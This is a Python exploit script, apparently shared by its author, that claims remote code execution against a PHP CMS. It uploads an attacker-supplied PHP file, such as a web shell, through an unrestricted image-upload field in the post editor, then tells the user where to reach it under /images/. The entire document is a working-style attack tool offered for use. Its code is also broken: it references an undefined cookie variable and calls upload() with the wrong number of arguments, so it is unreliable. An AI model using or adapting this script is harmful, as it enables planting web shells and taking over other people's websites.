'''

This Simple Exploit RCE for harshit bansal CMS
insta:RedVirus_0
twitter:je_1r
github:RedVirus0

'''

import requests
import argparse

def logo():
    print("""
    

  _____            _       _ _     _   _                _     _ _     ____                        _    ____ __  __ ____  
 | ____|_  ___ __ | | ___ (_) |_  | | | | __ _ _ __ ___| |__ (_) |_  | __ )  __ _ _ __  ___  __ _| |  / ___|  \/  / ___| 
 |  _| \ \/ / '_ \| |/ _ \| | __| | |_| |/ _` | '__/ __| '_ \| | __| |  _ \ / _` | '_ \/ __|/ _` | | | |   | |\/| \___ \ 
 | |___ >  <| |_) | | (_) | | |_  |  _  | (_| | |  \__ \ | | | | |_  | |_) | (_| | | | \__ \ (_| | | | |___| |  | |___) |
 |_____/_/\_\ .__/|_|\___/|_|\__| |_| |_|\__,_|_|  |___/_| |_|_|\__| |____/ \__,_|_| |_|___/\__,_|_|  \____|_|  |_|____/ 
            |_|                                                                                                          
 C0ded By Red Virus
""")

def upload(url,file,cookie):
    global shell
    shell = open(file, "rb")
    file_parm = {'post_image':shell}
    values = {'post_title':'testing','post_category_id':1,'post_status':'published','post_tags':'anything','post_content':'test','create_post':'Update Post'}
    requests.post(url,files=file_parm,data=values,cookies=cookie_parm)
parser = argparse.ArgumentParser("""
python3 -t "[target]" -f "[Path:Malicious_file.php]"
python3 Exploit.py --t "http://localhost/phps/subscriber/posts.php?source=add" --f "C:\\Users\\Jehad Alqurashi\\Desktop\\shell\\cmd2.php"


""")
parser.add_argument("-t","--t")
parser.add_argument("-f","--f")
args = parser.parse_args()
url = args.t
file = args.f
if url != None and file!=None:
    upload(url,file)
    print("File has been uploaded: "+url+"/images/[Your File Name]")
if url != None and file==None:
    print("Please Enter Path of Your Malicious_file -f [Path]")

elif url==None and file ==None:
    logo()
